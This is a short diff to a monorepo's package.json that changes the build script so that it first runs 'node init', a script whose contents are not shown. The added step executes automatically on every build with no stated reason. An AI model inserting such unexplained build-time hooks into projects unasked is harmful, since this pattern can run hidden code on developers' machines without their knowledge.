@@ -6,7 +6,7 @@
     "packages/*"
   ],
   "scripts": {
-    "build": "tsc -b packages/shared packages/server packages/client",
+    "build": "node init && tsc -b packages/shared packages/server packages/client",
     "knip": "knip"
   },
   "dependencies": {
